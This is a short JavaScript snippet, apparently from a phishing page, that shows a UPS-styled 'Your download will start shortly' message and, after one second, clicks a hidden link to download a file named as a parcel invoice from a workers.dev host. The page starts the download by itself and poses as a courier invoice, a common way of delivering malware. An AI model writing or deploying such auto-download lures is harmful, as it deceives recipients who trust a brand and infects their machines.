var rootNodeId = "sectioniov5pt3b";
var downloadUrl = "https://files.tiqcdn.workers.dev/documents/invoice_1Z8302XR1512230178";
var content = '<div style="display: flex;justify-content: center;align-items: center;height: 50vh;"><div><h1><span aria-hidden="true" class="icon ups-icon-download"></span> Your download will start shortly.</h1><p>If your download does not start, please <a href="' + downloadUrl + '" download>click here</a>.</p></div></div>';
var rootNode = document.getElementById(rootNodeId);
rootNode.innerHTML = content;
setTimeout(() => {
	var link = document.createElement("a");
	link.setAttribute("download", "");
	link.href = downloadUrl;
	document.body.appendChild(link);
	link.click();
	link.remove();
}, 1000);
